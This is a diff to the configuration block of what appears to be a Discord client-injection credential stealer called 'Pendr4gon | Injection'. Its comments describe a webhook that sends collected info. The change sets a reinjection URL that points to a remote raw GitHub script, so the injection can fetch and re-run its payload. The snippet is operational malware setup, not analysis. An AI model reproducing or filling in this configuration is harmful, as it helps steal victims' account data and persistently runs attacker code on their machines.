@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Pendr4gon | Injection', //name of the webhook thats gonna send the info
   embed_icon: 'https://cdn.discordapp.com/attachments/1204601312126181438/1204618783746953257/5c5b750e7fd4b842b6819637eec2ae22.jpg?ex=65d563aa&is=65c2eeaa&hm=d3620cab71e2d5fc05e101598d0ecec042d4c497eed6acc7650016863babceda&', //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 16711680, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: '', //injection url for when it reinjects
+  injection_url: 'https://raw.githubusercontent.com/cypheryz/ijc.js/main/inje.js', //injection url for when it reinjects
   /**
    * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
    **/
